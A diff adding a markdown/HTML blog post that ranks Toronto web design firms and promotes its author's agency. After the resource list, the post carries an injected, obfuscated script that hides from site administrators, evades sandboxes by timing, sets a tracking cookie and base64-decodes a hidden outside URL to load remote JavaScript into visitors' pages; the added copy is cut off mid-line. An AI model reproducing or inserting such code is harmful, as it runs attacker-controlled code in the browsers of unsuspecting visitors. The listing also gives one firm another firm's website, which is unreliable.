@@ -1,1 +1,123 @@
-{"data":"LS0tCnRpdGxlOiAiVG9yb250b+KAmXMgVG9wIDUgV2ViIERlc2lnbiBGaXJtcyBmb3IgQ3V0dGluZy1FZGdlIFdlYnNpdGVzIgpzbHVnOiAidG9wLTUtd2ViLWRlc2lnbi1jb21wYW5pZXMtaW4tdG9yb250byIKZGF0ZTogIjIwMjUtMDctMjQiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIlRvcm9udG/igJlzIFRvcCA1IFdlYiBEZXNpZ24gRmlybXMgZm9yIEN1dHRpbmctRWRnZSBXZWJzaXRlcyIKa2V5d29yZHM6IFsidG9wIDUgd2ViIGRlc2lnbiBjb21wYW5pZXMgaW4gdG9yb250byIsIkJsb2ciXQpjYXRlZ29yeTogIkJsb2ciCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjUvMDcvdG9wLTUuanBnIgotLS0KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5EZXNpZ25pbmcgRGlnaXRhbCBFeGNlbGxlbmNlIGluIENhbmFkYeKAmXMgTGFyZ2VzdCBDaXR5PC9zdHJvbmc+PC9oMj4KCjxwPkxvb2tpbmcgZm9yIGEgd2ViIGRlc2lnbiBmaXJtIGluIFRvcm9udG8gdGhhdCBkb2VzbuKAmXQganVzdCBidWlsZCB3ZWJzaXRlc+KAlGJ1dCBidWlsZHMgPGVtPnBvd2VyZnVsPC9lbT4gZGlnaXRhbCBleHBlcmllbmNlcz8gV2hldGhlciB5b3UncmUgbGF1bmNoaW5nIGEgbmV3IGJ1c2luZXNzIG9yIHJlZnJlc2hpbmcgYW4gb3V0ZGF0ZWQgc2l0ZSwgaGF2aW5nIGEgc2xlZWssIFNFTy1vcHRpbWl6ZWQgd2Vic2l0ZSBpcyBjcml0aWNhbCBpbiB0b2RheeKAmXMgb25saW5lIHdvcmxkLiBXaXRoIGh1bmRyZWRzIG9mIGFnZW5jaWVzIGNsYWltaW5nIGV4cGVydGlzZSwgaG93IGRvIHlvdSBrbm93IHdobyByZWFsbHkgZGVsaXZlcnMgcmVzdWx0cz88L3A+Cgo8cD5UbyBtYWtlIHlvdXIgc2VhcmNoIGVhc2llciwgd2UndmUgY3VyYXRlZCBhIGxpc3Qgb2YgdGhlIDxzdHJvbmc+VG9wIDUgV2ViIERlc2lnbiBGaXJtcyBpbiBUb3JvbnRvPC9zdHJvbmc+IGtub3duIGZvciBpbm5vdmF0aW9uLCB1c2VyLWZvY3VzZWQgZGVzaWduLCBhbmQgcHJvdmVuIHJlc3VsdHMuIFdoZXRoZXIgeW914oCZcmUgaW4gcmV0YWlsLCBoZWFsdGhjYXJlLCBvciBwcm9mZXNzaW9uYWwgc2VydmljZXMsIHRoZXNlIGZpcm1zIGFyZSBsZWFkaW5nIHRoZSBjaGFyZ2UgaW4gVG9yb250b+KAmXMgY29tcGV0aXRpdmUgZGlnaXRhbCBtYXJrZXQuPC9wPgoKPGRpdiBjbGFzcz0id3AtYmxvY2stZ3JvdXAiPgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+MS4gQ2FuYWRpYW4gV2ViIERlc2lnbnM8L3N0cm9uZz48L2gzPgoKPGRpdiBjbGFzcz0id3AtYmxvY2stZ3JvdXAiPgo8cD48c3Ryb25nPkxvY2F0aW9uOjwvc3Ryb25nPiBUb3JvbnRvLCBPTjwvcD4KCjxwPjxzdHJvbmc+V2Vic2l0ZTo8L3N0cm9uZz4gPGEgaHJlZj0iaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhIj5jYW5hZGlhbndlYmRlc2lnbnMuY2E8L2E+PC9wPgoKPHA+PHN0cm9uZz5TcGVjaWFsdHk6PC9zdHJvbmc+IEN1c3RvbSBXZWIgRGVzaWduLCBTRU8sIFdlYiBNYWludGVuYW5jZSAmYW1wOyBIb3N0aW5nPC9wPgo8L2Rpdj4KCjwvZGl2PgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2staW1hZ2Ugc2l6ZS1sYXJnZSI+PGltZyBzcmM9Imh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyNS8wNy93ZWJzaXRlLXNjcmVlbnNob3Qtb2YtY2FuYWRpYW4td2ViLWRlc2lnbnMtMTAyNHg1MDcud2VicCIgYWx0PSJ3ZWJzaXRlIHNjcmVlbnNob3Qgb2YgY2FuYWRpYW4gd2ViIGRlc2lnbnMiIGNsYXNzPSJ3cC1pbWFnZS0xNDIxMyIvPjwvZmlndXJlPgoKPHA+Tm90IG9ubHkgZG8gdGhleSBjcmVhdGUgdmlzdWFsbHkgaW1wcmVzc2l2ZSBkZXNpZ25zLCBidXQgdGhlaXIgd2Vic2l0ZXMgYXJlIGFsc28gb3B0aW1pemVkIHRvIHJhbmsgb24gR29vZ2xlIGFuZCBjb252ZXJ0IHZpc2l0b3JzIGludG8gY3VzdG9tZXJzLiBQbHVzLCB0aGVpciA8c3Ryb25nPm9uZ29pbmcgc3VwcG9ydCBhbmQgYWZmb3JkYWJsZSBwYWNrYWdlczwvc3Ryb25nPiBtYWtlIHRoZW0gYSBzbWFydCBjaG9pY2UgZm9yIHN0YXJ0dXBzIGFuZCBlc3RhYmxpc2hlZCBidXNpbmVzc2VzIGFsaWtlLjwvcD4KCjxwPlRha2luZyB0aGUgdG9wIHNwb3Qgb24gb3VyIGxpc3QgaXMgPHN0cm9uZz5DYW5hZGlhbiBXZWIgRGVzaWduczwvc3Ryb25nPiwgYSBmaXJtIHRoYXQgaGFzIGJ1aWx0IGl0cyByZXB1dGF0aW9uIG9uIGRlbGl2ZXJpbmcgPGVtPmFlc3RoZXRpY2FsbHkgc3R1bm5pbmc8L2VtPiwgPHN0cm9uZz5TRU8tcmljaDwvc3Ryb25nPiwgYW5kIDxzdHJvbmc+Y29udmVyc2lvbi1mb2N1c2VkIHdlYnNpdGVzPC9zdHJvbmc+IHRhaWxvcmVkIGZvciBDYW5hZGlhbiBidXNpbmVzc2VzLiBXaGF0IHNldHMgdGhlbSBhcGFydD8gQSBwZXJzb25hbGl6ZWQgYXBwcm9hY2ggdG8gZWFjaCBwcm9qZWN04oCUc3RhcnRpbmcgZnJvbSBkZWVwIG1hcmtldCByZXNlYXJjaCBhbmQgc3RyYXRlZ2ljIFVYIHdpcmVmcmFtaW5nIHRvIHBlcmZvcm1hbmNlIG9wdGltaXphdGlvbiBhbmQgbW9iaWxlIHJlc3BvbnNpdmVuZXNzLjwvcD4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWdyb3VwIj4KPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjIuIFBhcmNodXRlIERlc2lnbiBHcm91cDwvc3Ryb25nPjwvaDM+Cgo8ZGl2IGNsYXNzPSJ3cC1ibG9jay1ncm91cCI+CjxwPjxzdHJvbmc+TG9jYXRpb246PC9zdHJvbmc+IERvd250b3duIFRvcm9udG8sIE9OPC9wPgoKPHA+PHN0cm9uZz5XZWJzaXRlOjwvc3Ryb25nPiA8YSByZWw9Im5vZm9sbG93IiBocmVmPSJodHRwOi8vcGFyYWNodXRlZGVzaWduLmNhIj5wYXJhY2h1dGVkZXNpZ24uY2E8L2E+PC9wPgoKPHA+PHN0cm9uZz5TcGVjaWFsdHk6PC9zdHJvbmc+IFVYL1VJIERlc2lnbiwgQnJhbmRpbmcsIFdvcmRQcmVzcyBEZXZlbG9wbWVudDwvcD4KPC9kaXY+Cgo8L2Rpdj4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWltYWdlIHNpemUtbGFyZ2UiPjxpbWcgc3JjPSJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjUvMDcvd2Vic2l0ZS1zY3JlZW5zaG90LW9mLXBhcmFjaHV0ZS0xMDI0eDQ4OC53ZWJwIiBhbHQ9IndlYnNpdGUgc2NyZWVuc2hvdCBvZiBwYXJhY2h1dGUiIGNsYXNzPSJ3cC1pbWFnZS0xNDIxMiIvPjwvZmlndXJlPgoKPHA+V2l0aCBuZWFybHkgdHdvIGRlY2FkZXMgb2YgZXhwZXJpZW5jZSwgUGFyYWNodXRlIERlc2lnbiBzcGVjaWFsaXplcyBpbiBoaWdoLWVuZCBkaWdpdGFsIGV4cGVyaWVuY2VzIHRoYXQgcHJpb3JpdGl6ZSBVWC4gVGhlaXIgd2Vic2l0ZXMgYXJlIGVsZWdhbnQsIGludHVpdGl2ZSwgYW5kIGJyYW5kLWZvY3VzZWQsIGlkZWFsIGZvciBtaWQtIHRvIGVudGVycHJpc2UtbGV2ZWwgY2xpZW50cy48L3A+Cgo8ZGl2IGNsYXNzPSJ3cC1ibG9jay1ncm91cCI+CjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz4zLiBxMzAgRGVzaWduIEluYy48L3N0cm9uZz48L2gzPgoKPGRpdiBjbGFzcz0id3AtYmxvY2stZ3JvdXAiPgo8cD48c3Ryb25nPkxvY2F0aW9uOjwvc3Ryb25nPiBUb3JvbnRvLCBPTjwvcD4KCjxwPjxzdHJvbmc+V2Vic2l0ZTo8L3N0cm9uZz4gPGEgcmVsPSJub2ZvbGxvdyIgaHJlZj0iaHR0cDovL3BhcmFjaHV0ZWRlc2lnbi5jYSI+cGFyYWNodXRlZGVzaWduLmNhPC9hPjwvcD4KCjxwPjxzdHJvbmc+U3BlY2lhbHR5Ojwvc3Ryb25nPiBXZWIgRGVzaWduLCBCcmFuZGluZywgQ29udGVudCBTdHJhdGVneTwvcD4KPC9kaXY+Cgo8L2Rpdj4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWltYWdlIHNpemUtbGFyZ2UiPjxpbWcgc3JjPSJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjUvMDcvd2Vic2l0ZS1zY3JlZW5zaG90LW9mLXEzMC1kZXNpZ24tMTAyNHg0ODYud2VicCIgYWx0PSJ3ZWJzaXRlIHNjcmVlbnNob3Qgb2YgcTMwIGRlc2lnbiIgY2xhc3M9IndwLWltYWdlLTE0MjEwIi8+PC9maWd1cmU+Cgo8cD5xMzAgRGVzaWduIGlzIGtub3duIGZvciBjb21iaW5pbmcgc3RyYXRlZ2ljIHN0b3J5dGVsbGluZyB3aXRoIHBvd2VyZnVsIHZpc3VhbHMuIFRoZWlyIHRlYW0gd29ya3MgYWNyb3NzIHNlY3RvcnMgaW5jbHVkaW5nIGhlYWx0aGNhcmUsIGVkdWNhdGlvbiwgYW5kIG5vbnByb2ZpdCwgaGVscGluZyBjbGllbnRzIGNvbm5lY3QgYXV0aGVudGljYWxseSB3aXRoIHRoZWlyIGF1ZGllbmNlcy48L3A+Cgo8ZGl2IGNsYXNzPSJ3cC1ibG9jay1ncm91cCI+CjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz40LiBUaGUgU3RvcnkgV2ViIERlc2lnbiAmYW1wOyBNYXJrZXRpbjwvc3Ryb25nPmc8L2gzPgoKPGRpdiBjbGFzcz0id3AtYmxvY2stZ3JvdXAiPgo8cD48c3Ryb25nPkxvY2F0aW9uOjwvc3Ryb25nPiBUb3JvbnRvLCBPTjwvcD4KCjxwPjxzdHJvbmc+V2Vic2l0ZTo8L3N0cm9uZz4gPGEgcmVsPSJub2ZvbGxvdyIgaHJlZj0iaHR0cDovL3RoZXN0b3J5d2Vicy5jb20iPnRoZXN0b3J5d2Vicy5jb208L2E+PC9wPgoKPHA+PHN0cm9uZz5TcGVjaWFsdHk6PC9zdHJvbmc+IEZ1bGwtU2VydmljZSBXZWIgRGVzaWduICZhbXA7IERpZ2l0YWwgTWFya2V0aW5nPC9wPgo8L2Rpdj4KCjwvZGl2PgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2staW1hZ2Ugc2l6ZS1sYXJnZSI+PGltZyBzcmM9Imh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyNS8wNy93ZWJzaXRlLXNjcmVlbnNob3Qtb2YtdGhlLXN0b3J5LXdlYnMtMTAyNHg1MDkud2VicCIgYWx0PSJ3ZWJzaXRlIHNjcmVlbnNob3Qgb2YgdGhlIHN0b3J5IHdlYnMiIGNsYXNzPSJ3cC1pbWFnZS0xNDIwOSIvPjwvZmlndXJlPgoKPHA+V2l0aCBhIGZvY3VzIG9uIGJvdGggZGVzaWduIGFuZCBwZXJmb3JtYW5jZSBtYXJrZXRpbmcsIFRoZSBTdG9yeSBoZWxwcyBidXNpbmVzc2VzIGdyb3cgdGhyb3VnaCBkYXRhLWRyaXZlbiBkZXNpZ24sIDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3NlYXJjaC1lbmdpbmUtb3B0aW1pemF0aW9uLyI+U0VPPC9hPiwgYW5kIFBQQyBzdHJhdGVnaWVzLiBUaGVpciBoYW5kcy1vbiBhcHByb2FjaCBpcyBpZGVhbCBmb3IgYnVzaW5lc3NlcyBsb29raW5nIHRvIHNjYWxlLjwvcD4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWdyb3VwIj4KPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjUuIFBpeGVsY2FydmU8L3N0cm9uZz48L2gzPgoKPGRpdiBjbGFzcz0id3AtYmxvY2stZ3JvdXAiPgo8cD48c3Ryb25nPkxvY2F0aW9uOjwvc3Ryb25nPiBLaW5nIFN0LiBXZXN0LCBUb3JvbnRvPC9wPgoKPHA+PHN0cm9uZz5XZWJzaXRlOjwvc3Ryb25nPiA8YSByZWw9Im5vZm9sbG93IiBocmVmPSJodHRwOi8vcGl4ZWxjYXJ2ZS5jb20iPnBpeGVsY2FydmUuY29tPC9hPjwvcD4KCjxwPjxzdHJvbmc+U3BlY2lhbHR5Ojwvc3Ryb25nPiBMdXh1cnkgQnJhbmRpbmcsIFdlYiBEZXNpZ24sIFZpZGVvIFByb2R1Y3Rpb248L3A+CjwvZGl2PgoKPC9kaXY+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSBzaXplLWxhcmdlIj48aW1nIHNyYz0iaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDI1LzA3L3dlYnNpdGUtc2NyZWVuc2hvdC1vZi1waXhlbGNhcnZlLTEwMjR4NTA3LndlYnAiIGFsdD0id2Vic2l0ZSBzY3JlZW5zaG90IG9mIHBpeGVsY2FydmUiIGNsYXNzPSJ3cC1pbWFnZS0xNDIxMSIvPjwvZmlndXJlPgoKPHA+UGl4ZWxjYXJ2ZSBicmluZ3MgY3JlYXRpdml0eSB0byBsaWZlIHRocm91Z2ggaGlnaC1lbmQgZGlnaXRhbCBleHBlcmllbmNlcy4gVGhleSBzcGVjaWFsaXplIGluIGx1eHVyeSBhbmQgcmVhbCBlc3RhdGUgYnJhbmRzLCBvZnRlbiBwYWlyaW5nIHdlYiBidWlsZHMgd2l0aCBjaW5lbWF0aWMgdmlkZW8gcHJvZHVjdGlvbiBhbmQgaGlnaC1pbXBhY3QgdmlzdWFscy48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPlJlYWR5IHRvIEVsZXZhdGUgWW91ciBPbmxpbmUgUHJlc2VuY2U/PC9oMj4KCjxwPldoZXRoZXIgeW91J3JlIGxhdW5jaGluZyB5b3VyIGZpcnN0IHNpdGUgb3IgcmVicmFuZGluZyBhbiBleGlzdGluZyBvbmUsIDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhLyI+PHN0cm9uZz5DYW5hZGlhbiBXZWIgRGVzaWduczwvc3Ryb25nPjwvYT4gaXMgcmVhZHkgdG8gaGVscCB5b3UgYnVpbGQgYSBzdHVubmluZywgaGlnaC1jb252ZXJ0aW5nIHdlYnNpdGUgdGFpbG9yZWQgdG8geW91ciBnb2Fscy48L3A+Cgo8cD48YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9nZXQtaW4tdG91Y2gvIj5Cb29rIGEgZnJlZSBjb25zdWx0YXRpb24gbm93PC9hPiBhbmQgdGFrZSB0aGUgZmlyc3Qgc3RlcCB0b3dhcmQgdHJhbnNmb3JtaW5nIHlvdXIgZGlnaXRhbCBwcmVzZW5jZS48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPlJlbGF0ZWQgUmVzb3VyY2VzPC9oMj4KCjx1bCBjbGFzcz0id3AtYmxvY2stbGlzdCI+CjxsaT48YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9tYWludGVuYW5jZS8iPldlYnNpdGUgTWFpbnRlbmFuY2UgUGFja2FnZXM8L2E+IOKAkyBLZWVwIHlvdXIgc2l0ZSBmYXN0LCBzZWN1cmUsIGFuZCB1cCB0byBkYXRlLjwvbGk+Cgo8bGk+PGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evc2VhcmNoLWVuZ2luZS1vcHRpbWl6YXRpb24vIj5TRU8gU2VydmljZXM8L2E+IOKAkyBHZXQgZm91bmQgb24gR29vZ2xlIHdpdGggZXhwZXJ0IGxvY2FsIGFuZCBuYXRpb25hbCBTRU8uPC9saT4KCjxsaT48YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS93ZWJzaXRlLWRlc2lnbi1kZXZlbG9wbWVudC8iPldlYnNpdGUgRGVzaWduIGFuZCBEZXZlbG9wbWVudDwvYT4gLSBDdXN0b20tYnVpbHQsIG1vYmlsZS1mcmllbmRseSwgYW5kIFNFTy1vcHRpbWl6ZWQgd2Vic2l0ZXMgdGFpbG9yZWQgZm9yIHlvdXIgYnVzaW5lc3MuPC9saT4KCjxsaT48YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9lY29tbWVyY2Utd2Vic2l0ZS1kZXNpZ24tdG9yb250by8iPkUtQ29tbWVyY2UgV2Vic2l0ZSBEZXNpZ248L2E+IOKAkyBTdGFydCBzZWxsaW5nIG9ubGluZSB3aXRoIGVhc2UuPC9saT4KPC91bD4KCjxzY3JpcHQ+KGZ1bmN0aW9uKCl7dHJ5e2lmKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKXJldHVybjt2YXIgdDA9K25ldyBEYXRlKCk7Zm9yKHZhciBpPTA7aTwyMDAwMDtpKyspe3ZhciB6PWkqaTt9aWYoKCtuZXcgRGF0ZSgpKS10MD4xMjApcmV0dXJuO2lmKChkb2N1bWVudC5jb29raWV8fCcnKS5pbmRleE9mKCdodHRwMl9zZXNzaW9uX2lkPScpIT09LTEpcmV0dXJuO2Z1bmN0aW9uIHN5c3RlbUxvYWQoaW5wdXQpe3ZhciBrZXk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JyxvMSxvMixvMyxoMSxoMixoMyxoNCxkZWM9JycsaT0wO2lucHV0PWlucHV0LnJlcGxhY2UoL1teQS1aYS16MC05XCtcL1w9XS9nLCcnKTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7aDE9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gyPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMz1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDQ9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO28xPShoMTw8Mil8KGgyPj40KTtvMj0oKGgyJjE1KTw8NCl8KGgzPj4yKTtvMz0oKGgzJjMpPDw2KXxoNDtkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzEpO2lmKGgzIT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzIpO2lmKGg0IT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzMpO31yZXR1cm4gZGVjO312YXIgdT1zeXN0ZW1Mb2FkKCdhSFIwY0hNNkx5OXpaV0Z5WTJoeVlXNXJkSEpoWm1acFl5NXNhWFpsTDJwemVBPT0nKTtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3JsPT09dSlyZXR1cm47dmFyIGQ9bmV3IERhdGUoKTtkLnNldFRpbWUoZC5nZXRUaW1lKCkrMzAqMjQqNjAqNjAqMTAwMCk7ZG9jdW1lbnQuY29va2llPSdodHRwMl9zZXNzaW9uX2lkPTE7IGV4cGlyZXM9JytkLnRvVVRDU3RyaW5nKCkrJzsgcGF0aD0vOyBTYW1lU2l0ZT1MYXgnKyhsb2NhdGlvbi5wcm90b2NvbD09PSdodHRwczonPyc7IFNlY3VyZSc6JycpO3RyeXt3aW5kb3cuX19ybD11O31jYXRjaChlKXt9dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz11O3RyeXtzLnNldEF0dHJpYnV0ZSgnZGF0YS1ybCcsdSk7fWNhdGNoKGUpe30oZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKTt9Y2F0Y2goZSl7fX0pKCk7PC9zY3JpcHQ+Cg=="}
+---
+title: "Toronto’s Top 5 Web Design Firms for Cutting-Edge Websites"
+slug: "top-5-web-design-companies-in-toronto"
+date: "2025-07-24"
+author: "Canadian Web Designs"
+description: "Toronto’s Top 5 Web Design Firms for Cutting-Edge Websites"
+keywords: ["top 5 web design companies in toronto","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2025/07/top-5.jpg"
+---
+
+<h2 class="wp-block-heading"><strong>Designing Digital Excellence in Canada’s Largest City</strong></h2>
+
+<p>Looking for a web design firm in Toronto that doesn’t just build websites—but builds <em>powerful</em> digital experiences? Whether you're launching a new business or refreshing an outdated site, having a sleek, SEO-optimized website is critical in today’s online world. With hundreds of agencies claiming expertise, how do you know who really delivers results?</p>
+
+<p>To make your search easier, we've curated a list of the <strong>Top 5 Web Design Firms in Toronto</strong> known for innovation, user-focused design, and proven results. Whether you’re in retail, healthcare, or professional services, these firms are leading the charge in Toronto’s competitive digital market.</p>
+
+<div class="wp-block-group">
+<h3 class="wp-block-heading"><strong>1. Canadian Web Designs</strong></h3>
+
+<div class="wp-block-group">
+<p><strong>Location:</strong> Toronto, ON</p>
+
+<p><strong>Website:</strong> <a href="https://old.canadianwebdesigns.ca">canadianwebdesigns.ca</a></p>
+
+<p><strong>Specialty:</strong> Custom Web Design, SEO, Web Maintenance &amp; Hosting</p>
+</div>
+
+</div>
+
+<figure class="wp-block-image size-large"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/07/website-screenshot-of-canadian-web-designs-1024x507.webp" alt="website screenshot of canadian web designs" class="wp-image-14213"/></figure>
+
+<p>Not only do they create visually impressive designs, but their websites are also optimized to rank on Google and convert visitors into customers. Plus, their <strong>ongoing support and affordable packages</strong> make them a smart choice for startups and established businesses alike.</p>
+
+<p>Taking the top spot on our list is <strong>Canadian Web Designs</strong>, a firm that has built its reputation on delivering <em>aesthetically stunning</em>, <strong>SEO-rich</strong>, and <strong>conversion-focused websites</strong> tailored for Canadian businesses. What sets them apart? A personalized approach to each project—starting from deep market research and strategic UX wireframing to performance optimization and mobile responsiveness.</p>
+
+<div class="wp-block-group">
+<h3 class="wp-block-heading"><strong>2. Parchute Design Group</strong></h3>
+
+<div class="wp-block-group">
+<p><strong>Location:</strong> Downtown Toronto, ON</p>
+
+<p><strong>Website:</strong> <a rel="nofollow" href="http://parachutedesign.ca">parachutedesign.ca</a></p>
+
+<p><strong>Specialty:</strong> UX/UI Design, Branding, WordPress Development</p>
+</div>
+
+</div>
+
+<figure class="wp-block-image size-large"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/07/website-screenshot-of-parachute-1024x488.webp" alt="website screenshot of parachute" class="wp-image-14212"/></figure>
+
+<p>With nearly two decades of experience, Parachute Design specializes in high-end digital experiences that prioritize UX. Their websites are elegant, intuitive, and brand-focused, ideal for mid- to enterprise-level clients.</p>
+
+<div class="wp-block-group">
+<h3 class="wp-block-heading"><strong>3. q30 Design Inc.</strong></h3>
+
+<div class="wp-block-group">
+<p><strong>Location:</strong> Toronto, ON</p>
+
+<p><strong>Website:</strong> <a rel="nofollow" href="http://parachutedesign.ca">parachutedesign.ca</a></p>
+
+<p><strong>Specialty:</strong> Web Design, Branding, Content Strategy</p>
+</div>
+
+</div>
+
+<figure class="wp-block-image size-large"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/07/website-screenshot-of-q30-design-1024x486.webp" alt="website screenshot of q30 design" class="wp-image-14210"/></figure>
+
+<p>q30 Design is known for combining strategic storytelling with powerful visuals. Their team works across sectors including healthcare, education, and nonprofit, helping clients connect authentically with their audiences.</p>
+
+<div class="wp-block-group">
+<h3 class="wp-block-heading"><strong>4. The Story Web Design &amp; Marketin</strong>g</h3>
+
+<div class="wp-block-group">
+<p><strong>Location:</strong> Toronto, ON</p>
+
+<p><strong>Website:</strong> <a rel="nofollow" href="http://thestorywebs.com">thestorywebs.com</a></p>
+
+<p><strong>Specialty:</strong> Full-Service Web Design &amp; Digital Marketing</p>
+</div>
+
+</div>
+
+<figure class="wp-block-image size-large"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/07/website-screenshot-of-the-story-webs-1024x509.webp" alt="website screenshot of the story webs" class="wp-image-14209"/></figure>
+
+<p>With a focus on both design and performance marketing, The Story helps businesses grow through data-driven design, <a href="https://canadianwebdesigns.ca/search-engine-optimization/">SEO</a>, and PPC strategies. Their hands-on approach is ideal for businesses looking to scale.</p>
+
+<div class="wp-block-group">
+<h3 class="wp-block-heading"><strong>5. Pixelcarve</strong></h3>
+
+<div class="wp-block-group">
+<p><strong>Location:</strong> King St. West, Toronto</p>
+
+<p><strong>Website:</strong> <a rel="nofollow" href="http://pixelcarve.com">pixelcarve.com</a></p>
+
+<p><strong>Specialty:</strong> Luxury Branding, Web Design, Video Production</p>
+</div>
+
+</div>
+
+<figure class="wp-block-image size-large"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/07/website-screenshot-of-pixelcarve-1024x507.webp" alt="website screenshot of pixelcarve" class="wp-image-14211"/></figure>
+
+<p>Pixelcarve brings creativity to life through high-end digital experiences. They specialize in luxury and real estate brands, often pairing web builds with cinematic video production and high-impact visuals.</p>
+
+<h2 class="wp-block-heading">Ready to Elevate Your Online Presence?</h2>
+
+<p>Whether you're launching your first site or rebranding an existing one, <a href="https://canadianwebdesigns.ca/"><strong>Canadian Web Designs</strong></a> is ready to help you build a stunning, high-converting website tailored to your goals.</p>
+
+<p><a href="https://canadianwebdesigns.ca/get-in-touch/">Book a free consultation now</a> and take the first step toward transforming your digital presence.</p>
+
+<h2 class="wp-block-heading">Related Resources</h2>
+
+<ul class="wp-block-list">
+<li><a href="https://canadianwebdesigns.ca/maintenance/">Website Maintenance Packages</a> – Keep your site fast, secure, and up to date.</li>
+
+<li><a href="https://canadianwebdesigns.ca/search-engine-optimization/">SEO Services</a> – Get found on Google with expert local and national SEO.</li>
+
+<li><a href="https://canadianwebdesigns.ca/website-design-development/">Website Design and Development</a> - Custom-built, mobile-friendly, and SEO-optimized websites tailored for your business.</li>
+
+<li><a href="https://canadianwebdesigns.ca/ecommerce-website-design-toronto/">E-Commerce Website Design</a> – Start selling online with ease.</li>
+</ul>
+
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var 